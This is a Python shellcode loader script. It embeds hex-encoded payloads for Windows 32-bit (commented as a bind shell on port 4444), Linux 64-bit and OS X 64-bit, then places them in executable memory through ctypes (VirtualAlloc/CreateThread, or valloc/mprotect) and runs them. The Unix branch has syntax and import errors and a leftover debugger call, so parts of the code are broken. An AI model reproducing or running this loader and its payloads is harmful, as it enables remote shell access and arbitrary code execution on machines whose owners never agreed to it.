#!/usr/bin/env python

import ctypes
import os
import mmap

# please comment out the appropriate payload for the other platforms
# this below is for windows 32 bit shell bind tcp listening at 4444
#buf  = ""
#buf += "\xba\xea\x63\x18\xbc\xda\xc5\xd9\x74\x24\xf4\x5f\x31"
#buf += "\xc9\xb1\x53\x31\x57\x12\x83\xef\xfc\x03\xbd\x6d\xfa"
#buf += "\x49\xbd\x9a\x78\xb1\x3d\x5b\x1d\x3b\xd8\x6a\x1d\x5f"
#buf += "\xa9\xdd\xad\x2b\xff\xd1\x46\x79\xeb\x62\x2a\x56\x1c"
#buf += "\xc2\x81\x80\x13\xd3\xba\xf1\x32\x57\xc1\x25\x94\x66"
#buf += "\x0a\x38\xd5\xaf\x77\xb1\x87\x78\xf3\x64\x37\x0c\x49"
#buf += "\xb5\xbc\x5e\x5f\xbd\x21\x16\x5e\xec\xf4\x2c\x39\x2e"
#buf += "\xf7\xe1\x31\x67\xef\xe6\x7c\x31\x84\xdd\x0b\xc0\x4c"
#buf += "\x2c\xf3\x6f\xb1\x80\x06\x71\xf6\x27\xf9\x04\x0e\x54"
#buf += "\x84\x1e\xd5\x26\x52\xaa\xcd\x81\x11\x0c\x29\x33\xf5"
#buf += "\xcb\xba\x3f\xb2\x98\xe4\x23\x45\x4c\x9f\x58\xce\x73"
#buf += "\x4f\xe9\x94\x57\x4b\xb1\x4f\xf9\xca\x1f\x21\x06\x0c"
#buf += "\xc0\x9e\xa2\x47\xed\xcb\xde\x0a\x7a\x3f\xd3\xb4\x7a"
#buf += "\x57\x64\xc7\x48\xf8\xde\x4f\xe1\x71\xf9\x88\x06\xa8"
#buf += "\xbd\x06\xf9\x53\xbe\x0f\x3e\x07\xee\x27\x97\x28\x65"
#buf += "\xb7\x18\xfd\x10\xbf\xbf\xae\x06\x42\x7f\x1f\x87\xec"
#buf += "\xe8\x75\x08\xd3\x09\x76\xc2\x7c\xa1\x8b\xed\x93\x6e"
#buf += "\x05\x0b\xf9\x9e\x43\x83\x95\x5c\xb0\x1c\x02\x9e\x92"
#buf += "\x34\xa4\xd7\xf4\x83\xcb\xe7\xd2\xa3\x5b\x6c\x31\x70"
#buf += "\x7a\x73\x1c\xd0\xeb\xe4\xea\xb1\x5e\x94\xeb\x9b\x08"
#buf += "\x35\x79\x40\xc8\x30\x62\xdf\x9f\x15\x54\x16\x75\x88"
#buf += "\xcf\x80\x6b\x51\x89\xeb\x2f\x8e\x6a\xf5\xae\x43\xd6"
#buf += "\xd1\xa0\x9d\xd7\x5d\x94\x71\x8e\x0b\x42\x34\x78\xfa"
#buf += "\x3c\xee\xd7\x54\xa8\x77\x14\x67\xae\x77\x71\x11\x4e"
#buf += "\xc9\x2c\x64\x71\xe6\xb8\x60\x0a\x1a\x59\x8e\xc1\x9e"
#buf += "\x69\xc5\x4b\xb6\xe1\x80\x1e\x8a\x6f\x33\xf5\xc9\x89"
#buf += "\xb0\xff\xb1\x6d\xa8\x8a\xb4\x2a\x6e\x67\xc5\x23\x1b"
#buf += "\x87\x7a\x43\x0e"

# below is for linux 64 bit
#buf =  ""
#buf += "\x48\x31\xc9\x48\x81\xe9\xf5\xff\xff\xff\x48\x8d\x05"
#buf += "\xef\xff\xff\xff\x48\xbb\xe2\x84\x40\x50\xd7\xb2\x87"
#buf += "\x69\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
#buf += "\x88\xad\x18\xc9\xbd\xb0\xd8\x03\xe3\xda\x4f\x55\x9f"
#buf += "\x25\xd5\xae\xe6\xa0\x42\x50\xc6\xee\xcf\xe0\x04\xee"
#buf += "\x50\x0a\xbd\x83\xdf\x66\xe7\xee\x72\x08\xd8\xb7\xcf"
#buf += "\x58\x14\xee\x6b\x08\xd8\xb7\xcf\xfe\x88\x87\x1e\x18"
#buf += "\x28\x7c\xed\x48\xba\x8b\x45\x25\x21\xd8\xbc\x31\x7b"
#buf += "\xcc\xfb\x7f\xb5\xdb\xe9\x46\x91\xec\x40\x03\x9f\x3b"
#buf += "\x60\x3b\xb5\xcc\xc9\xb6\xd8\xb7\x87\x69"

# below is for osx 64 bit
buf =  ""
buf += "\x48\x31\xc9\x48\x81\xe9\xef\xff\xff\xff\x48\x8d\x05"
buf += "\xef\xff\xff\xff\x48\xbb\x77\x5d\xeb\x43\x4e\xdc\x4d"
buf += "\xbe\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
buf += "\xcf\x3c\xeb\x43\x4c\xb6\x4f\xe1\x1d\x5c\xb5\x0b\x7f"
buf += "\x0e\x42\xbb\x3f\xd4\x2c\xfb\x26\xdc\x4d\xbc\x3f\x6c"
buf += "\x1d\x15\xf0\xdc\x4f\xaf\x2b\x0b\xa3\xca\xa8\xb6\x5d"
buf += "\xe4\x78\x58\x53\x29\x4e\xdc\x4f\xf6\x46\xab\xa3\xbc"
buf += "\x88\x95\xc4\x42\x78\x58\x53\x5d\x4e\xdc\x4f\xf2\xfe"
buf += "\xba\xa3\xca\xa8\x94\xc4\x5c\x3f\xde\x01\x47\x41\xd9"
buf += "\x05\x37\xb0\xe5\xb1\x43\x4e\xde\x05\x8f\x81\x52\xee"
buf += "\xfb\x14\xdc\x4d\xbc\x3f\xa2\x2d\x4c\x4b\x94\x7c\x7e"
buf += "\xcf\x66\xeb\x43\x4c\x34\x45\xbe\x77\x5d\xc4\x21\x27"
buf += "\xb2\x62\xcd\x1f\x5d\xa3\xc8\x72\xf8\x05\x8f\xa5\x0f"
buf += "\xbc\x0b\xc7\x3a\x42\xbb"

def main(shellcode):
    if os.name == 'posix':                         # for unix systems
        try:
            import pdb; pdb.set_trace()
            libc = ctypes.CDLL('libc.so.6')                                 # reference to standard lib c functions
            size = len(shellcode)                                          # size of the shellcode
            sc = ctypes.c_char_p(shellcode)                                 # very similar to creating a buffer the size of the shellcode
            free_space = libc.valloc(size)                 # reserving freespace in the process memory for the shellcode
            if free_space == 0:
                print "could not allocate memory"
            free_space = c_void_p(free_space)
            ctypes.memmove(free_space, sc, size)                            # copying from shellcode pointer to free_space pointer
            if 0 != libc.mprotect(free_space, size, 1 | 2 | 4)                            # giving the freespace RWX permissions with code 7
            run = ctypes.cast(free_space, ctypes.CFUNCTYPE(ctypes.c_void_p))# cast function that returns void pointer to the alloc free space
            run()                                                           # running the casted function which is the free space containing
            sys.exit()                                                                     # shellcode
        except Exception as e:
            print 'Error when running shellcode on unix systems', e

    else:                                                                   # for windows system
        try:
                
            shellcode = bytearray(shellcode)                           # converting shellcode into bytes

            # allocating the space for reserve and commit at the length of the shellcode bytes to be executed

            ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),      # null pointer constant value for starting address to allocate
                    ctypes.c_int(len(shellcode)),                           # length of our shellcode in byte array format
                    ctypes.c_int(0x3000),                                   # reserve and commit allocation type flag
                    ctypes.c_int(0x40))                                     # enable xwr access to the commited region

            # creating a ctypes buffer with the size of the shellcode and points to the shellcode content
            buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)   # similar to cytpes.c_char_p(shellcode) in unix

            # move the converted buffer to the reserved and commited process memory space
            ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr), buf, ctypes.c_int(len(shellcode)))      # similar to memmove in unix

            # create and start executing the thread from the reserved memory pointer location
            thread_handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),                # null for pointer to security attr
                    ctypes.c_int(0),                                        # initial size of stack, 0 is for new thread
                    ctypes.c_int(ptr),                                      # pointer to the location that we start executing for new thread 
                    ctypes.c_int(0),                                        # null for pointer for params passed to thread
                    ctypes.c_int(0),                                        # 0 for creation flag, thread runs immediately after creation 
                    ctypes.pointer(ctypes.c_int(0)))                        # pointer to an int location to store thread id
                                                                                # thread_handle is returned in the end

            # at last, we block execution until thread is finished executing
            ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(thread_handle), ctypes.c_int(-1))       # non 0 value, aka -1 for wait
        except Exception as e:
            print "Error in executing the shellcode in windows system", e
if __name__ == '__main__':
    main(buf)
